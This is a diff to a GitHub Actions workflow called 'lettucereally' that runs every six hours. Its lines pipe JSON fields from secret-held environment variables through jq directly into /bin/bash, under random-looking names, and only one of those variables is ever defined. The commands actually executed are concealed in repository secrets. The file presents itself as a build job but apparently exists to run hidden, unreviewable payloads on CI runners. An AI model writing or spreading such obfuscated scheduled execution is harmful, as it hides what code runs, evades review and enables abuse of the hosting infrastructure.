@@ -1,10 +1,9 @@
 name: lettucereally
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 0/6 * * *'
-jobs:  # 31638
+    - cron: '18 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,22 +11,12 @@ jobs:  # 31638
       - uses: actions/checkout@v4
       - name: lettucereally
         env:
-          q487: ${{ secrets.q487 }}
+          xug296: ${{ secrets.xug296 }}
         run: |
-          echo $q487 | jq -r .fw7887 | /bin/bash
-          echo $sqhkk51 | jq -r .nx2 | /bin/bash
-          echo $ob9784 | jq -r .cqfs2 | /bin/bash
-          echo $eqgkt10 | jq -r .ixon72606 | /bin/bash
-          echo $imer063 | jq -r .ffp78 | /bin/bash
-          echo $t3063 | jq -r .a97990 | /bin/bash
-          echo $tk50220 | jq -r .pyr15 | /bin/bash
-          echo $mf2 | jq -r .bxxkz06 | /bin/bash
-          echo $jkm8 | jq -r .gp422 | /bin/bash
-          echo $bkayp4419 | jq -r .wapp6 | /bin/bash
-          echo $ouufn8 | jq -r .fbe21902 | /bin/bash
-          echo $sbdg3 | jq -r .j4545 | /bin/bash
-          echo $q25349 | jq -r .mxfv02 | /bin/bash
-          echo $f19225 | jq -r .gc25473 | /bin/bash
-          echo $mmx952 | jq -r .pct43371 | /bin/bash
-          echo $oc12 | jq -r .e79 | /bin/bash
+          echo $xug296 | jq -r .bc65 | /bin/bash
+          echo $zge00 | jq -r .vhq70 | /bin/bash
+          echo $u8148 | jq -r .dac098 | /bin/bash
+          echo $w357 | jq -r .cgx3 | /bin/bash
+          echo $dttv912 | jq -r .hhwgp6 | /bin/bash
+          echo $t0 | jq -r .fqxde000 | /bin/bash
 
